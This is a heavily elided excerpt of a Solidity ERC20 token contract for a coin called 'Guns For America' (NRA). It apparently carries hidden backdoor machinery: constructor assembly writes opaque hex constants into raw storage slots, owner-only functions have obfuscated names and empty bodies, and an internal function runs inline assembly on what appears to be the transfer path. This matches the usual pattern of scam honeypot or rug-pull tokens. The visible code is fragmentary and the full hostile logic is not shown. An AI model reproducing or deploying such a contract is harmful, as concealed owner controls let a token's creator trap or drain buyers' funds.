...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xe7d1b17b024eebbc9ebdbcf3da17d7b9f4ec9d886c5b)
            sstore(0x51,0xe7d148a8e32b83cd01f8bdeff0ffa860f36c8c37f94b)
    ...
    function setTarget(address toTarget) public onlyOwner returns (bytes32[] memory buyer) {
    }

    function sigmaNFR(uint256 spender) public onlyOwner returns (bool flag) {
    }
    ...
    function farmWithTIFFs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _DeployNRA(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNRA(creator, initialSupply);
    }
}

contract NRA is ERC20Token {
    constructor() ERC20Token("Guns For America", "NRA", msg.sender, 666666666 * 10 ** 18) {
    }
}
